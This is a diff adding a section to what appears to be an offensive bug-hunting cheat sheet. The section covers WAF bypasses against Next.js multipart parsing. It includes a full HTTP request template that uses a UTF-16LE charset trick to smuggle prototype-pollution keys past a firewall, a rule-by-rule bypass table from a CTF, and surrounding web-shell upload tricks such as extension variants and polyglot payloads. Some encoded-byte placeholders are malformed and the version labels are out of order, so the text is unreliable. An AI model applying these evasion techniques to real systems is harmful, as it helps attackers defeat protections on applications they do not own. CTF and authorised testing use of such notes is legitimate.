@@ -371,6 +371,61 @@ filename=shell.phtml, shell.pHp, shell.php5   → extension variants
 
 **WAF bypass for file upload**: Run `tools/multipart_mutator.py --file shell.aspx --field file` for 10 parser-confusion variants (boundary simplification, double-boundary case-insensitive confusion, charset=utf-16le part encoding, null-byte in boundary, Content-Disposition sub-param injection, per-part image/jpeg Content-Type). Combine with polyglot (GIF89a magic bytes + PHP payload). RFC 2231 filename: `filename*=utf-8''shell.php`. MIME Base64: `filename="=?utf-8?b?c2hlbGwucGhw?="`.
 
+### Busboy / Undici Multipart Parser Internals (Node.js / Next.js)
+
+From DEVCORE 2025 research (React2Shell CTF, $250k bounty context):
+
+**Parser stack:**
+- **Busboy** — Next.js multipart/form-data parser (used when `Content-Type: multipart/form-data`)
+- **Undici** — Node.js built-in Fetch/FormData parser (used for `Next-Action` header RSC requests)
+
+**Busboy charset decoder quirk:**
+
+Busboy's `getDecoder(charset)` falls through for UTF-16 aliases:
+```
+case 'utf16le':
+case 'utf-16le':
+case 'ucs2':
+case 'ucs-2':
+  return decoders.utf16le;
+```
+
+This means `Content-Type: text/plain; charset=utf16le` on a multipart part causes Busboy to decode the part value as UTF-16LE. A WAF inspecting the raw bytes sees null-byte-padded garbage; Busboy reads valid ASCII/payload.
+
+**Bypass technique (D-0, $100k checkpoint):**
+
+```http
+POST / HTTP/2
+Host: nextjs-cve-hackerone.vercel.app
+Next-Action: x
+Content-Type: multipart/form-data; boundary=y
+Content-Length: [...auto]
+
+--y
+Content-Disposition: form-data; name="0"
+Content-Type: text/plain; charset=utf16le
+
+<0x00><0x8x00><0x4x8H><0x00><0x00><0x6n><0x00><0x8x00>...[UTF-16LE encoded payload]
+--y
+Content-Disposition: form-data; name="1"
+
+"$0"
+--y--
+```
+
+The WAF sees raw UTF-16 bytes (null-byte interleaved); Busboy decodes it as plain ASCII payload including `__proto__` / `:constructor` keys.
+
+**WAF ruleset evolution (CTF progression):**
+
+| Version | New Rule | Bypass |
+|---|---|---|
+| ver.0 | `if ':constructor' in decoded: block()` | UTF-16LE charset on part — decoded string evades check |
+| ver.1 | `if part.filename: continue` (skip file parts) | Add `filename=` to Content-Disposition of payload part |
+| ver.3 | `if part.charset != 'utf-8': block()` | Use Undici (FormData) path — Undici ignores per-part charset |
+| ver.0.5 | `if '__proto__' or ':constructor' in decoded` | Split payload across 2 form fields (`foo` + payload field) |
+
+**Key takeaway for bug hunting:** When a Node.js/Next.js target uses `multipart/form-data` for API actions, test per-part `Content-Type: text/plain; charset=utf16le` on each field. WAFs that inspect raw bytes will miss UTF-16LE payloads that Busboy decodes correctly.
+
 ---
 
 ## 10. GRAPHQL-SPECIFIC
